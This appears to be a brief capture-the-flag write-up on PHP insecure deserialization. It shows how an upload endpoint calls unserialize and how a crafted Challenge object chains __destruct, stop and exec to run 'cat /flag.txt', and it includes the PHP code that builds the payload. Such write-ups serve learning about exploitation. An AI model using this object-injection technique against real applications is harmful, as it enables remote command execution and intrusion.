First of all, it is convinient to look for fthe function unserialize with ctrl+f+shift
then, we will find it in the file upload_user.php
Here, basically, there is a button to load a file and it unserializes the file received.
The trick is to pass a file with a Challenge object serialized instead of a User.
In this way, it is possible to use __destruct() -> stop() -> exec()
notice that the source code for the lasses is in data.php.
However, with exec you can execute  linux command.
The following code is the one used to serialized the object:
<?php
class Challenge{

  public $name;
  public $description;
  public $setup_cmd="not null";
  public $stop_cmd="cat /flag.txt";

  function __construct($name, $description){
    $this->name = $name;
    $this->description = $description;
  }
}

$user = new Challenge("cane2","a");
//print_r($user);
echo serialize($user);
?>
